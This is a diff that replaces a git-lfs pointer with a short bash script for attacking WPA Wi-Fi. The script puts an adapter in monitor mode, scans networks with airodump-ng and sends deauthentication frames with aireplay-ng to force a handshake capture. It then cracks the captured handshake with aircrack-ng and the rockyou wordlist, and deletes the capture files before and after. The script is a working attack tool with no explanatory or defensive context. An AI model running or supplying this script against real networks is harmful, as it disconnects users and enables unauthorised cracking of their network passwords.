@@ -1,3 +1,15 @@
-version https://git-lfs.github.com/spec/v1
-oid sha256:09850cc43e8c55da2385c3d848a7d75cb139ca902b38fb5b09c94d2decbd2caf
-size 595
+#!/bin/bash
+sudo rm -rf wpacap-01*
+read -p "Please enter your wireless adapter interface name (use iwconfig):" wlan
+sudo ifconfig $wlan down
+sudo iwconfig $wlan mode monitor
+sudo ifconfig $wlan up
+sudo timeout 12s airodump-ng $wlan
+read -p "Please choose a WPA encrypted network bssid/mac from above:" NetMac
+read -p "please specify channel of network:" c
+sudo iwconfig $wlan channel $c
+sudo aireplay-ng --deauth 25 -a $NetMac $wlan &
+sudo sudo timeout 20s airodump-ng --bssid $NetMac --channel $c $wlan --write wpacap &
+wait
+sudo aircrack-ng wpacap-01.cap -w rockyou.txt
+sudo rm -rf wpacap-01*
